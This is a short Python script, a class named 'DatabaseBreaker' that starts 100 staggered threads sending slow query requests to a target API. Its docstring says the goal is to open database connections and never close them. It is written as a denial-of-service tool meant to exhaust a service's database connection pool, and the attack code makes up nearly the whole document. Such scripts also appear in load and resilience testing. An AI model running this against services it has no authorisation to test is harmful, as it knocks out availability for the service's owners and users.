import requests
import threading
import time

class DatabaseBreaker:
    def __init__(self, api_url):
        self.api_url = api_url
        
    def exhaust_database_connections(self, num_threads=100):
        """Open many database connections and never close them"""
        print(f"🗄️ Exhausting database connections with {num_threads} threads...")
        
        def long_running_query(thread_id):
            try:
                # Simulate expensive database queries
                payload = {
                    "query": "SELECT * FROM large_table WHERE complex_condition = true",
                    "delay": "5"  # Ask server to simulate 5-second query
                }
                
                # This will hold database connections open
                response = requests.post(
                    f"{self.api_url}/api/query",
                    json=payload,
                    timeout=30  # Keep connection open for 30 seconds
                )
                print(f"Thread {thread_id}: Query completed")
            except requests.exceptions.Timeout:
                print(f"Thread {thread_id}: TIMEOUT - database connection held!")
            except Exception as e:
                print(f"Thread {thread_id}: Error - {e}")
        
        threads = []
        for i in range(num_threads):
            thread = threading.Thread(target=long_running_query, args=(i,))
            threads.append(thread)
            thread.start()
            time.sleep(0.1)  # Stagger starts
        
        for thread in threads:
            thread.join()